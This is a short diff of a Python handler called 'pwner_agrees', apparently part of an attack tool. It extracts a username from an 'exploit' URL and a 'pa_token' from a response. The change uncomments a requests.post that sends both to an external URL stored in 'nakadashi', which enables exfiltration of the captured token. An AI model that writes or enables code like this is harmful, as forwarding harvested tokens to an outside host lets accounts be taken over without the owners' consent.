@@ -57,7 +57,7 @@ def pwner_agrees():
     obj['testusername'] = exploit.split('.com/')[1].split('/')[0]
     obj['testtoken'] = r['pa_token']
 
-    # requests.post(nakadashi + "?name="+name, json=obj)
+    requests.post(nakadashi + "?name="+name, json=obj)
 
     return {}, 200 
 
